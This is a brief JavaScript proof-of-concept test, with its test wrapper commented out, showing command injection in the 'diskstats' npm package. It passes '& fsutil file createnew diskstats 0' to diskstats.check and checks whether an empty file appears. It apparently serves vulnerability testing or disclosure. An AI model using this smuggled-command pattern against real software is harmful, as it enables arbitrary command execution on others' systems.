// test("Command Injection in diskstats", (done) => {
//   expect.assertions(2);
  const diskstats = require("diskstats");
  const fs = require("fs");
  const path = "./diskstats";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
//       console.log("File removed:", path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + false + " }");
  diskstats.check("& fsutil file createnew diskstats 0", () => {
    file_exist = fs.existsSync(path);
console.log("{ " + file_exist + ", " + true + " }");
    fs.unlinkSync(path);
//     done();
  });
// });
